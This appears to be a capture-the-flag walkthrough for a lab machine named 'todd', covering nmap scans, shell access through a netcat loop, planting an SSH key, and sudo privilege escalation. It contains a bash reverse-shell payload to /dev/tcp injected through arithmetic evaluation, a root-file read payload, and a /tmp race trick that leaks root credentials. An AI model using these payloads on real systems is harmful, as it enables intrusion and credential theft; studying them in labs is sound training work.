## Reconnaissance

### Initial Nmap Scan
```bash
$ nmap -sV -sC -p- 192.168.56.3 -A

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
2519/tcp  open  tcpwrapped
4470/tcp  open  tcpwrapped
...
```

### Second Nmap Scan Reveals Interesting Port
```bash
$ nmap -sV -p- 192.168.56.3
-----------
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
7066/tcp  open  unknown
...
```

Note: Port 7066 appears intermittently.

## Initial Access via Port 7066

### Persistent Connection Attempt
```bash
$ while true;do nc 192.168.56.3 7066;done
(UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
(UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
whoami
todd
```

### Establishing SSH Access
1. Generate SSH key on attacker machine:
```bash
ssh-keygen -t rsa -f todd
```

2. On target machine:
```bash
mkdir -p /home/todd/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOd2qBPt87qsYOMlBoxpn6uTqyKwHLIXcNj8eO.... void-strike@athena" > /home/todd/.ssh/authorized_keys
```

3. Connect via SSH:
```bash
ssh todd@192.168.56.3 -i ~/.ssh/todd
```

## Privilege Escalation

### Checking Sudo Privileges
```bash
$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

### Analyzing guess_and_check.sh
```bash
# check this script used by human 
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

### Method 1: File Creation Exploit
1. Create dummy files to increase probability:
```bash
for i in {1..600}; do touch /tmp/$i ;done
```

2. Run the script repeatedly until successful:
```bash
sudo /bin/bash /srv/guess_and_check.sh
```

### Method 2: Command Injection
1. Execute arbitrary commands through input:
```bash
Please Input [316]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>N[$(/bin/bash -i >& /dev/tcp/192.168.56.1/9001 0>&1)]
```

2. Set up listener:
```bash
nc -vlnp 9001
```

### Explanation of Command Injection
The input `N[$(cat /root/root.txt)]` is interpreted in an arithmetic context, causing Bash to attempt evaluating the flag contents as arithmetic, which fails and reveals the flag content in the error message.

## Root Access
Use the credentials from /root/.cred to switch to root:
```bash
su
Password: [content of /root/.cred]
root@todd:/home/todd#
```

Or via the reverse shell obtained through command injection.
